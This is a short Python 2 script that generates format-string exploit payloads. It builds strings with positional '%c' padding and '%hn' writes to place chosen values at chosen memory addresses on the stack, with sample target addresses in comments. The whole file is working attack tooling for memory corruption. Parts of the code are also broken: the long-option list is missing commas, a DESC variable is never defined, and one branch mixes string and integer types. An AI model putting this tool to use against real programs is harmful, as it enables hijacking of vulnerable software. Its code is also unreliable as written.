#!/usr/bin/python
import sys, getopt

if __name__ == "__main__":
    try:
        optlist, args = getopt.getopt(sys.argv[1:], "hw:v:s:r", ["help", "write" "value" "stack", "reverse"])
    except getopt.GetoptError, err:
        print str(err)
        print DESC
        sys.exit(2)
    write = -1
    stack = -1
    reverse = False
    writtenvalues = ()
    for o, a in optlist:
        if o in ("-s", "--stack"): # how many slots up on the stack until the string starts
            stack = int(a)
        if o in ("-r", "--reverse"): # have the single pointer encoded at the end of the string
            reverse = True
        if o in ("-w", "--write"): # value to write
            write = a
        if (write != -1 and stack != -1):
            writtenvalues += ( ((int(write[0:write.find(':')], 0), int(write[write.find(':')+1:], 0))), )
            write = -1
    if (writtenvalues != ()):
        #print write_formatstring( writtenvalues, int(stack, 0), roff)
        for write in writtenvalues:
            address, value = write
            roff = 0
            out = ''
            if reverse:
                out = out + '%1$' + str(value-roff) + 'c'
                addslots = (len(out)+7 + 4 + len(str(stack))) / 8 # 7 for modulo 8, 4 for length of format string
                if stack < 10 and stack + addslots > 10:
                    addslots = (len(out)+7 + 4 + len(str(stack)) + 1) / 8 # we spill number of slots, tf +1
                out = out + '%' + str(stack+addslots) + '$hn'
                for i in range(addslots*8 - len(out)):
                    out = out + 'A'
                out = out + hex(address)[2:].decode("hex")[::-1]
            else:
                out = out + hex(address)[2:].decode("hex")[::-1]
                roff = roff + len(out)
                out = out + '%1$' + str(value-roff) + 'c'
                out = out + '%' + stack + '$hn'
            print out
    #write_formatstring( ((0x30313233, 0x34353637),(0x38393a3b, 0x3c3d3e3f),), 10, 0)
    #print write_formatstring( ((0xffffd36c, 0x080484e2),), 4, 0)
